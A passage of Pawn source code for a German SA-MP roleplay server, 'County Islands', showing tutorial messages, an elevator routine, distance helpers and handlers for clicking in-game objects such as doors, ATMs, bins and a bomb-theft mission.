	    SendClientMessage(playerid,COLOR_WEISS,"Sollte zu deinem Todeszeitpunkt ein Fire & Rescue Mitarbeiter im Dienst sein, so bleibst Du eine weile an der Unfallstelle. ");
	    SendClientMessage(playerid,COLOR_WEISS,"In diesem Zeitraum wird ein Fire & Rescue Mitarbeiter informiert und versucht so schnell wie möglich zu dir zu kommen,");
	    SendClientMessage(playerid,COLOR_WEISS,"um dich Wiederzubeleben. Ein Relogg im Krankenhaus wird dir in dieser Situation nicht helfen, da die Zeit wieder von vorne anfangen würde.");
	    SendClientMessage(playerid,COLOR_WEISS,"");
	    SetPlayerCameraPos(playerid,1775.6735,-9284.3828,13.1380);
	    SetPlayerCameraLookAt(playerid,1752.1100,-9313.8252,5.0306);
	    tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 5)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 5/10] - Autohaus und Fahrzeuge");
	    SendClientMessage(playerid,COLOR_WEISS,"Einen Fahrbahren Untersatz findest Du im Autohaus. Du findest eins in Lake Sorten sowohl auch in Santa Felton.");
	    SendClientMessage(playerid,COLOR_WEISS,"Regelmäßig ändern sich die Fahrzeuge und Preise. Es gibt auch Limited Editionen, z.B der Infernus, der nur einmal existiert.");
	    SendClientMessage(playerid,COLOR_WEISS,"Gekaufte Fahrzeuge können an andere Spieler weiterverkauft werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"Autos die keiner mehr haben will, können am Schrottplatz in Santa Felton verschrottet werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"");
	    SetPlayerCameraPos(playerid,1705.4915,-9296.2861,7.2041);
	    SetPlayerCameraLookAt(playerid,1748.1392,-9261.9102,4.4024);
	    tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 6)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 6/10] - Fraktionen");
	    SendClientMessage(playerid,COLOR_WEISS,"Du entscheidest deinen Weg, wirst Du ein Cop? Oder begibst Du dich auf die Illegale Seite der Gangs/Mafien und handelst mit Drogen und Waffen.");
	    SendClientMessage(playerid,COLOR_WEISS,"Die Entscheidung liegt bei dir. Werde Feuerwehrmann oder arbeite im Rettungsdienst. Oder besser, werde Leader(Chef) einer Fraktion,");
	    SendClientMessage(playerid,COLOR_WEISS,"sorge für einen guten Aufstieg. Sollte deine Fraktion mit dir gut Geld verdienen,");
	    SendClientMessage(playerid,COLOR_WEISS,"so kann deine Fraktion aufgestockt werden mit weiteren Fahrzeugen, diese können im Fraktionsautohaus erworben werden.");
        SendClientMessage(playerid,COLOR_WEISS,"Um Leader einer Fraktion zu werden, bewerbe dich im Forum. {3C9DFF}www.county-islands.com");
        SendClientMessage(playerid,COLOR_WEISS,"");
        SetPlayerCameraPos(playerid,1773.8136,-8731.6416,24.1769);
	    SetPlayerCameraLookAt(playerid,1727.4407,-8795.4951,11.3746);

		tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 7)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 7/10] - Jobs");
	    SendClientMessage(playerid,COLOR_WEISS,"County Islands bietet dir eine große Auswahl an Jobs, werde Farmer, Müllmann, Taxifahrer, Busfahrer oder sogar Trucker.");
        SendClientMessage(playerid,COLOR_WEISS,"In der Stadthalle kannst du einen Job Annehmen. Du brauchst einen Job um an Geld zu kommen, damit Du dir z.B. ein Handy,");
        SendClientMessage(playerid,COLOR_WEISS,"Auto oder sogar ein Haus leisten kannst. Natürlich kannst Du dich auch für Illegale Dinge entscheiden,");
        SendClientMessage(playerid,COLOR_WEISS,"wie Drogen anpflanzen, ernten und verticken. Du solltest aber wissen, die Polizei kann dir Drogen abnehmen,");
        SendClientMessage(playerid,COLOR_WEISS,"und dich dafür eine gewisse Zeit einsperren.");
        SendClientMessage(playerid,COLOR_WEISS,"");
		SetPlayerCameraPos(playerid,4603.9824,-9330.1738,15.6436);
	    SetPlayerCameraLookAt(playerid,4561.4702,-9305.5205,4.4203);
		tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 8)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 8/10] - Tailcenter");
	    SendClientMessage(playerid,COLOR_WEISS,"Im Tailcenter findest Du die Fahrschule, um ein Fahrzeug führen zu dürfen muss ein Führerschein gemacht werden.");
        SendClientMessage(playerid,COLOR_WEISS,"Anfangs startest Du die Theorie, dann die Praktische Prüfung. Bist Du im Besitz des Waffenscheines, kannst Du hier");
        SendClientMessage(playerid,COLOR_WEISS,"Legal Waffen erwerben. Achte darauf die Waffen in der Öffentlichkeit nicht zu zeigen! Ebenso findest Du hier eine Bank.");
        SendClientMessage(playerid,COLOR_WEISS,"In der Bank kannst Du einen Kredit aufnehmen, Geld einzahlen/auszahlen, oder sogar die Bank überfallen!");
        SendClientMessage(playerid,COLOR_WEISS,"");
        SetPlayerCameraPos(playerid,1631.6199,-8565.9902,17.7594);
	    SetPlayerCameraLookAt(playerid,1598.7100,-8517.7402,4.7824);
		tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 9)
	{

		SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 9/10] - Die Stadthalle");
		SendClientMessage(playerid,COLOR_WEISS,"In der Stadthalle kannst Du dir einen Personalausweis beantragen, diesen benötigst Du um dich irgendwo einmieten und ausweisen zu können.");
        SendClientMessage(playerid,COLOR_WEISS,"Außerdem findest Du hier alle Jobs. Fahrzeuge benötigen ein Kennzeichen, dies kannst Du auch hier erwerben.");
        SendClientMessage(playerid,COLOR_WEISS,"Fraktionslosengeld kannst du hier auch beantragen.");
        SendClientMessage(playerid,COLOR_WEISS,"");
        SetPlayerCameraPos(playerid,1812.2605,-9299.7021,10.2541);
	    SetPlayerCameraLookAt(playerid,1836.8870,-9259.3242,4.4142);
		tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 10)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 10/10] - Geschafft!");
	    SendClientMessage(playerid,COLOR_WEISS,"Dein Inselabenteuer kann beginnen! Gleich wählst Du eine Stadt aus in der Du startest. Viele Features sind unter /hilfe zu finden. ");
        SendClientMessage(playerid,COLOR_WEISS,"Solltest Du neu in der San Andreas Multiplayer Szene sein, kannst du dich per /support melden und wir Helfen dir zurechtzukommen.");
        SendClientMessage(playerid,COLOR_WEISS,"Nutze den Befehl: {B90F00}/hilfe {FEFEFE}, dort findest Du weitere Befehle und Fragen die Du dir stellen wirst.");
        SendClientMessage(playerid,COLOR_WEISS,"Um dich auf unserer Insel zurecht zu finden, nutze /navi");
        SendClientMessage(playerid,COLOR_WEISS,"{FF6752}Wichtige Befehle: {B90F00}/hilfe {FEFEFE}(Features Hilfe) {B90F00}/navi {FEFEFE}(Wichtige Orte) {B90F00}/support{FEFEFE}(Fragen)");
        SendClientMessage(playerid,COLOR_WEISS,"");
        SetPlayerCameraPos(playerid,1796.4530,-9395.8047,23.3617);
	    SetPlayerCameraLookAt(playerid,1807.9462,-9286.6289,17.4385);
		tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 11)
	{
	    tutorialcp[playerid] = 0;
	    KillTimer(TUTTIMER[playerid]);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,"Herzlich Willkommen auf County Islands, wähle nun eine Stadt aus!");
	    ShowPlayerDialog(playerid,DIALOG_ORTSPAWN,DIALOG_STYLE_LIST,"Spawn Auswahl","Lake Sorten (Hauptstadt)\nSanta Felton","Spawnen","");
	}
	return 1;
}
AufzugBewegen(etage)
{
	new Float:X,Float:Y,Float:Z;
	AufzugBereit = 0;
	GetDynamicObjectPos(Aufzug,X,Y,Z);
	MoveDynamicObject(AufzugTuer[0],X,Y,Z,1.0);
	MoveDynamicObject(AufzugTuer[1],X,Y,Z,1.0);
	if(EtageChoose < sizeof(EtagenTuer))
	{
		GetDynamicObjectPos(EtagenTuer[EtageChoose][0],X,Y,Z);
		MoveDynamicObject(EtagenTuer[EtageChoose][0],X,Y+1.74,Z,1.0);
		MoveDynamicObject(EtagenTuer[EtageChoose][1],X,Y+1.74,Z,1.0);
		for(new x = 0; x < sizeof(EtagenText); x++)
		{
		    Update3DTextLabelText(EtagenText[x],0xFF0000FF,"Drücke '~k~~CONVERSATION_NO~' um den Aufzug zu rufen.");
		}
	}
	EtageChoose = etage;
	SetTimerEx("AufzugTueren",2000,0,"d",etage);
}
forward Persoantrag(playerid);
public Persoantrag(playerid)
{
	if(SpielerInfo[playerid][uPerso] == 0)
	{
	    persobeantragt[playerid] = 0;
		SpielerInfo[playerid][uPerso] = 1;
		SendClientMessage(playerid,COLOR_GREEN,"Personalausweis erhalten. - Du wirst nun als County Islands Bürger angesehen und hast das Recht ein Haus oder Geschäft zu mieten/kaufen.");
		GebeGeld(playerid,-21.80);
		if(SpielerInfo[playerid][ufPerso] == 0)
        {
        	SpielerInfo[playerid][ufPerso] = 1;
        	Missionenaktu(playerid);
        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Personalausweis {0080FF}(/missionen)");
        	new Float:belohnung;
        	belohnung = 100;
        	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
			GebeGeld(playerid,belohnung);
		}
	}
}
Float:GetDistanceBetweenPoints(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2) //By Gabriel "Larcius" Cordes
{
	return floatadd(floatadd(floatsqroot(floatpower(floatsub(x1,x2),2)),floatsqroot(floatpower(floatsub(y1,y2),2))),floatsqroot(floatpower(floatsub(z1,z2),2)));
}
Float:GetDistanceToPoint(playerid,Float:x1,Float:y1,Float:z1)
{
	if (IsPlayerConnected(playerid))
	{
		new Float:x2,Float:y2,Float:z2;
		GetPlayerPos(playerid,x2,y2,z2);
		return GetDistanceBetweenPoints(x1,y1,z1,x2,y2,z2);
	}
	return INF_FLOAT;
}
Float:GetDistanceToVehicle(playerid,vehicleid)
{
	if (IsPlayerConnected(playerid))
	{
		new Float:x1,Float:y1,Float:z1;
		GetVehiclePos(vehicleid,x1,y1,z1);
		return GetDistanceToPoint(playerid,x1,y1,z1);
	}
	return INF_FLOAT;
}

GetClosestVehicle(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new closestvehicle=0;
		new Float:closestdist=GetDistanceToVehicle(playerid,0);
		for(new vehicleid=0; vehicleid<MAX_VEHICLES; vehicleid++)
		{
			new Float:dist = GetDistanceToVehicle(playerid,vehicleid);
			if ((dist < closestdist))
			{
				closestdist = dist;
				closestvehicle = vehicleid;
			}
		}
		return closestvehicle;
	}
	return -1;
}
GetClosestVehicleWithout(playerid,withoutid) //By Darkrealm (edited by Gabrie "Larcius" Cordes)
{
	if(IsPlayerConnected(playerid))
	{
		new closestvehicle=0;
		new Float:closestdist=GetDistanceToVehicle(playerid,0);
		for(new vehicleid=0; vehicleid<MAX_VEHICLES; vehicleid++)
		{
		    if(vehicleid == withoutid) continue;
			new Float:dist = GetDistanceToVehicle(playerid,vehicleid);
			if ((dist < closestdist))
			{
				closestdist = dist;
				closestvehicle = vehicleid;
			}
		}
		return closestvehicle;
	}
	return -1;
}

public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float:x, Float:y, Float:z)
{
    if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
	for(new h = 0; h < MAX_HAEUSER; h++)
	{
		if(objectid == HausInfo[h][hTuer])
		{
		    TuerSelected[playerid][0] = h;
		    TuerSelected[playerid][1] = 1;
			if(HausInfo[h][hTuerOpen] == 0)
			{
			    if(HausInfo[h][hTuerLocked] == 1)
       			{
       			    if(SpielerInfo[playerid][uHausschluessel] == h)
			    	{
			    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufschließen","Okay","Abbrechen");
       				}
       				else
       				{
       				    SendClientMessage(playerid,COLOR_RED,"Abgeschlossen!");
       				}
		        }
				else
				{
				    if(SpielerInfo[playerid][uHausschluessel] == h)
			    	{
				    	ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen\nTür Abschließen","Okay","Abbrechen");
			    	}
			    	else
			    	{
			    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen","Okay","Abbrechen");
			    	}
				}
			}
			else
			{
   				ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Schließen","Okay","Abbrechen");
			}
  			CancelSelectTextDraw(playerid);
		    goto afterhaus;
		}
		if(objectid == HausInfo[h][hTuer2])
		{
			TuerSelected[playerid][0] = h;
		    TuerSelected[playerid][1] = 2;
			if(HausInfo[h][hTuer2Open] == 0)
			{
			    if(HausInfo[h][hTuer2Locked] == 1)
       			{
       			    if(SpielerInfo[playerid][uHausschluessel] == h)
			    	{
			    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufschließen","Okay","Abbrechen");
       				}
       				else
       				{
       				    SendClientMessage(playerid,COLOR_RED,"Abgeschlossen!");
       				}
		        }
				else
 				{
				    if(SpielerInfo[playerid][uHausschluessel] == h)
			    	{
				    	ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen\nTür Abschließen","Okay","Abbrechen");
			    	}
			    	else
			    	{
			    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen","Okay","Abbrechen");
			    	}
				}
			}
			else
			{
   				ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Schließen","Okay","Abbrechen");
			}
  			CancelSelectTextDraw(playerid);
		    goto afterhaus;
		}
		if(objectid == HausInfo[h][hTor])
		{
		    if(SpielerInfo[playerid][uHausschluessel] == h)
	    	{
				TuerSelected[playerid][0] = h;
			    TuerSelected[playerid][1] = 3;
			    new Float:X,Float:Y,Float:Z,Float:RX,Float:RY,Float:RZ;
			    GetDynamicObjectPos(HausInfo[h][hTor],X,Y,Z);
			    GetDynamicObjectRot(HausInfo[h][hTor],RX,RY,RZ);
			    
				if(HausInfo[h][hTorOpen] == 0 && modelid == 5043)
				{
					if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z+1.45,1,RX,RY+90,RZ);
					else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z+1.45,1,RX,RY+90,RZ);
					else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z+1.45,1,RX,RY+90,RZ);
					else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z+1.45,1,RX,RY-90,RZ);
					HausInfo[h][hTorOpen] = 2;
					SetTimerEx("Turzuruck",3000,0,"d",h);
				}
				else if(HausInfo[h][hTorOpen] == 1 && modelid == 5043)
				{
					if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z-1.45,1,RX,RY-90,RZ);
					else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z-1.45,1,RX,RY-90,RZ);
					else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z-1.45,1,RX,RY-90,RZ);
					else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z-1.45,1,RX,RY+90,RZ);
	   				HausInfo[h][hTorOpen] = 3;
	   				SetTimerEx("Turzuruck",3000,0,"d",h);
				}
				else if(HausInfo[h][hTorOpen] == 0 && modelid == 19861)
				{
					if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
					else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
					else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
					else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
					HausInfo[h][hTorOpen] = 2;
					SetTimerEx("Turzuruck",3000,0,"d",h);
				}
				else if(HausInfo[h][hTorOpen] == 1 && modelid == 19861)
				{
					if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
					else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
					else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
					else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
					HausInfo[h][hTorOpen] = 3;
					SetTimerEx("Turzuruck",3000,0,"d",h);
				}
  				CancelSelectTextDraw(playerid);
			}
		    goto afterhaus;
		}
		if(objectid == HausInfo[h][hSchild])
		{
		    new string[50];
		    format(string,sizeof string,"Preis: %.2f\nErfahrung: %d",HausInfo[h][hPreis],HausInfo[h][hErfahrung]);
		    ShowPlayerDialog(playerid,DIALOG_HAUSKAUF,DIALOG_STYLE_MSGBOX,"Hausinformationen",string,"Kaufen","Abbrechen");
		    HouseChosen[playerid] = h;
		    goto afterhaus;
		}
		/*if(objectid == HausInfo[h][hNummer])
		{
			if(SpielerInfo[playerid][uHausschluessel] == -1 && HausInfo[h][hMiete] != 0)
			{
			    CancelSelectTextDraw(playerid);
			    new name[40],string[100];
			    if(HausInfo[h][hBesitzer] != -1)
		        {
		        	format(string,sizeof string,"ID='%d'",HausInfo[h][hBesitzer]);
		        	mysqlget("login",string,"Name",name);
		        }
			    format(string,sizeof string,"Möchtest du das Haus von %s für %.2f$ / Payday mieten?",name,HausInfo[h][hMiete]);
				ShowPlayerDialog(playerid,DIALOG_MIETEN,DIALOG_STYLE_MSGBOX,"Mieten",string,"Mieten","Abbrechen");
				HouseChosen[playerid] = h;
				goto afterhaus;
			}
		}
		else if(objectid == HausInfo[h][hBriefkasten])
		{
		    new string[60];
		    if(SpielerInfo[playerid][uHausschluessel] == h)
		    {
				format(string,sizeof string,"SELECT * FROM `post` WHERE `Empfänger` = '%d'",SpielerInfo[playerid][uID]);
				//mysql_query(dbhandle, string);
		    }
		}*/
	}
	afterhaus:
	for(new b = 0; b < MAX_BIZ; b++)
	{
	    if(objectid == BizInfo[b][bSchild])
		{
		    new string[50];
		    format(string,sizeof string,"Preis: %.2f",BizInfo[b][bpreis]);
		    ShowPlayerDialog(playerid,DIALOG_BIZKAUF,DIALOG_STYLE_MSGBOX,"Bizinformationen",string,"Kaufen","Abbrechen");
		    bizidmerk[playerid] = b;
		}
	}
	if(SpielerInfo[playerid][uHausschluessel] > -1)
	{
		for(new m = 0; m < Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]; m++)
		{
		    if(objectid == Moebel[SpielerInfo[playerid][uHausschluessel]][m])
		    {
				ShowPlayerDialog(playerid,DIALOG_HAUS_OBJEKT,DIALOG_STYLE_MSGBOX,"Möbel","Was willst du mit diesem Objekt machen?","Editieren","Löschen");
				PlayerClickedObject[playerid] = m;
				PlayerClickedObjectModel[playerid] = modelid;
		        break;
		    }
		}
	}
	
	if(modelid == bombenobject)
	{
	    if(bombenklauen == 0)
	    {
	        new cops = 0;
	        WFrak(playerid);
	        if(Mitglied[playerid] != 1 && Mitglied[playerid] != 2 && Mitglied[playerid] != 3 && Mitglied[playerid] != 4 && Mitglied[playerid] != 5 && Mitglied[playerid] != 13 && Mitglied[playerid] != 14 && Mitglied[playerid] != 15)
	        {
	            for(new i = 0; i < MAX_PLAYERS; i++)
				{
 					if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1)
				    {
				        if(IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2) || IstSpielerInFrak(i,15))
				        {
					        cops++;
					        if(cops == 2) break;
						}
				    }
				}
				if(cops == 2)
				{
			        new string[128];
			        bombenklauen = 1;
			        SetTimer("Bombensetz",60000*60*1,0);
					Verstauen(playerid,bombenobject,1);
					SendClientMessage(playerid,COLOR_GREEN,"Du hast die Bombe geklaut!");
		   			format(string,sizeof string,"HQ: Die Bombe der U.S. Army wurde geklaut!");
					FraktionsNachricht(1,COLOR_HQ,string);
					format(string,sizeof string,"HQ: Die Bombe der U.S. Army wurde geklaut!");
					FraktionsNachricht(2,COLOR_HQ,string);
		  			for(new i = 0; i < MAX_PLAYERS; i++)
					{
				        PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/ArmySirene.mp3",4579.2930,-8681.4688,4.5018,400.0, 1);
					}
					if(SpielerInfo[playerid][ufBombe] == 0)
			        {
			        	SpielerInfo[playerid][ufBombe] = 1;
			        	Missionenaktu(playerid);
			        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Armybase einbruch {0080FF}(/missionen)");
			        	new Float:belohnung;
			        	belohnung = 800;
			        	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
						GebeGeld(playerid,belohnung);
					}
				}
				else{SendClientMessage(playerid,COLOR_RED,"Es sind zu wenig Polizisten online!");}
			}else{SendClientMessage(playerid,COLOR_RED,"Als Staatsdiener kannst du keine Bombe klauen!");}
	    }else{SendClientMessage(playerid,COLOR_RED,"Die Bombe kann noch nicht geklaut werden!");}
	}

	if(modelid == 1409 || modelid == 1227 || modelid == 1236 || modelid == 1343 || modelid == 1344 || modelid == 1345)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du musst zu Fuß unterwegs sein!");
		if(GetDistanceToPoint(playerid,x,y,z) > 5.0) return SendClientMessage(playerid,COLOR_RED,"Du befindest dich nicht in der Nähe der Mülltonne!");
	    CancelSelectTextDraw(playerid);
	    if(SpielerInfo[playerid][uJob] != 1)
	    {
		    new zahl = random(20);
		    if(zahl == 10 || zahl == 5)
		    {
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast eine Pfandflasche gefunden!");
		        if(!Verstauen(playerid,1486,1)) return SendClientMessage(playerid,COLOR_RED,"Inventar voll!");
			}
			else if(zahl == 17)
			{
			    new Float:geld = 10+random(40),string[50];
				format(string,sizeof string,"Du hast %.0f Cent gefunden!",geld);
				SendClientMessage(playerid,COLOR_GREEN,string);
				GebeGeld(playerid,geld/100);
			}
			else
			{
			    SendClientMessage(playerid,COLOR_RED,"Du hast nichts gefunden!");
			}
		}
		else
		{
		    MueltonneChoosen[playerid] = -1;
		    ShowPlayerDialog(playerid,DIALOG_MUELTONNE,DIALOG_STYLE_MSGBOX,"Mülltonne","Was willst du mit dieser Mülltonne machen?\n","Leeren","Durchsuchen");
		    for(new h = 0; h < sizeof(Mueltonnen); h++)
			{
				if(objectid == Mueltonnen[h][0])
				{
					MueltonneChoosen[playerid] = h;
					break;
				}
			}
			if(MueltonneChoosen[playerid] == -1)
			{
			    Mueltonnen[MueltonnenCount][0] = objectid;
			    MueltonneChoosen[playerid] = MueltonnenCount;
			    MueltonneGeleert[MueltonnenCount] = 0;
				MueltonnenCount++;
			}
		}
	}
	if(modelid == 2531)//Sprunk Schrank
	{
	    CancelSelectTextDraw(playerid);
	    new Float:health;
	    GetPlayerHealth(playerid,health);
	    GebeLeben(playerid,health+10);
	}
	if(objectid == GangDrogen[0][gTuer] && IstSpielerInFrak(playerid,8))
	{
	    new Float:RX,Float:RY,Float:RZ;
    	GetDynamicObjectRot(GangDrogen[0][gTuer],RX,RY,RZ);
	    if(RZ == 270) MoveObjektRot(GangDrogen[0][gTuer],0,0,360,9);
		else MoveObjektRot(GangDrogen[0][gTuer],0,0,270,9);
	}
	if(objectid == GangDrogen[1][gTuer] && IstSpielerInFrak(playerid,9))
	{
	    new Float:RX,Float:RY,Float:RZ;
    	GetDynamicObjectRot(GangDrogen[1][gTuer],RX,RY,RZ);
	    if(RZ == 180) MoveObjektRot(GangDrogen[1][gTuer],0,0,270,9);
		else MoveObjektRot(GangDrogen[1][gTuer],0,0,180,9);
	}
	for(new m = 0; m < sizeof(Moebelhaus); m++)
	{
		if(objectid == Moebelhaus[m])
		{
		    new string[20];
		    format(string,sizeof string,"Preis: %.2f$",MoebelPreise[m][MHPreis]);
			ShowPlayerDialog(playerid,DIALOG_MOEBELKAUF,DIALOG_STYLE_MSGBOX,"Möbel",string,"Kaufen","Abbrechen");
			HouseChosen[playerid] = m;
			SendClientMessage(playerid,COLOR_GREEN,"Möbel angeklickt!");
			break;
		}
	}
	if(modelid == 19324)
	{
	    if(SpielerInfo[playerid][ufATM] == 0)
        {
        	SpielerInfo[playerid][ufATM] = 1;
        	Missionenaktu(playerid);
        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Benutze den ATM {0080FF}(/missionen)");
        	new Float:belohnung;
        	belohnung = 80;
        	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
			GebeGeld(playerid,belohnung);
		}
	    for(new a = 0; a < sizeof(ATMmenu); a++)
		{
		    TextDrawShowForPlayer(playerid,ATMmenu[a]);
		}
		new string[25];
		PlayerTextDrawShow(playerid,ATMmenu_Stand[playerid]);
		format(string,sizeof string,"Kontostand:$ %.2f",SpielerInfo[playerid][uKonto]);
		PlayerTextDrawSetString(playerid,ATMmenu_Stand[playerid],string);
		SelectTextDraw(playerid, -8257281);
	}
	if(SpielerInfo[playerid][uAdmin] > 0)
	{
		for(new m = 0; m < aobjanzahl; m++)
		{
		    if(objectid == AdminObjecte[m])
		    {
		        EditDynamicObject(playerid,AdminObjecte[m]);
		    }
		}
	}
	return 1;
}
forward PNSClose(playerid);
public PNSClose(playerid)
{
	Respray[playerid] = 0;
    MoveDynamicObject(PNSEingang, -2708.580078, 1644.600097, 12.939999, 1, 0.00, 90.00, 90.00);
    MoveDynamicObject(PNSAusgang, -2708.879882, 1663.739990, 11.3000, 1, 0.00, 0.00, 270.00);
}
forward sftorzu(playerid);
public sftorzu(playerid)
{
    MoveDynamicObject(sftor,6505.8643, -8018.2754, 2.2655,1);
	return 1;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
    if (newkeys & KEY_FIRE) {
		if(GetPlayerWeapon(playerid) == 17) {
	        new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid, x, y, z);
       		for(new i = 0; i < MAX_PLAYERS; i++)
   			{
			   	if (IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i, 10.0, x, y, z) && ppMaske[i] == 0)
			   	{
        			ApplyAnimation(i, "ped", "gas_cwr", 1.0, 1, 0, 0, 0, 5000,1);
		    	}
		    }
    	}
	}
	new ud,lr;
    GetPlayerKeys(playerid,newkeys,ud,lr);
    if(HOLDING(KEY_FIRE) && (GetPlayerWeapon(playerid) == 9))
	{
		if(IstSpielerInFrak(playerid,4) || IstSpielerInFrak(playerid,3))
		{
			for(new i = 0; i < sizeof(baum_umgefallen); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid,15.0,baum_umgefallen[i][0],baum_umgefallen[i][1],baum_umgefallen[i][2]) && baum_umgefallen[i][4] > 0.0)
				{
     				baum_umgefallen[i][4] -= 25.0;
					new stext[84];
					format(stext,sizeof(stext),"Umgefallender Baum\nStatus: %0.0f / 2500",baum_umgefallen[i][4]);
					Update3DTextLabelText(baum_state,0x00E0FFB9,stext);
					if(baum_umgefallen[i][4] == 0.0)
					{
						remove_all_trees();
						baumTM = SetTimer("tree_timer",60000*20,false);
  						Fraktionskasse[4] -= 100.0;
			    		Frakkassespeichern(4);
			    		Fraktionskasse[14] -= 100.0;
			    		Frakkassespeichern(14);
						FraktionsNachricht(4,COLOR_LIGHTBLUE,"Der Baum wurde erfolgreich von der Straße entfernt! Der Einsatz ist beendet!");
						FraktionsNachricht(14,COLOR_LIGHTBLUE,"Der Baum wurde erfolgreich von der Straße entfernt! Der Einsatz ist beendet!");
					}
				}
			}
		}
		if(SpielerInfo[playerid][uJob] == 6)
		{
		    for(new x = 0; x < sizeof(baume); x++)
		    {
		        if(IsPlayerInRangeOfPoint(playerid,9.0,baume[x][0],baume[x][1],baume[x][2]) && Baumstatus[x] == 1 && GetPlayerWeapon(playerid) == 9)
		        {
					Baumleben[x] -= 20;
					new string[40];
					if(Baumleben[x] == 980 || Baumleben[x] == 900 || Baumleben[x] == 800 || Baumleben[x] == 700 || Baumleben[x] == 600 || Baumleben[x] == 500 || Baumleben[x] == 400 || Baumleben[x] == 300 ||Baumleben[x] == 200 ||Baumleben[x] == 100)
					{
					    format(string,sizeof(string),"%i",Baumleben[x]);
					    GameTextForPlayer(playerid,string,500,3);
					}
					if(Baumleben[x]  < 1 && Baumstatus[x] == 1)
					{
					    GebeWaffe(playerid,0,1);
					    Baumstatus[x] = 0;
					    DestroyDynamicObject(Baumholz[x]);
					    SendClientMessage(playerid,COLOR_GREEN,"Baum gefällt! Du kannst es nun im Industriegebiet abgeben! (/navi)");
					    Verstauen(playerid,1463,1);
					}
		        }
		    }
		}
	}
	else if(newkeys == KEY_SECONDARY_ATTACK)
	{
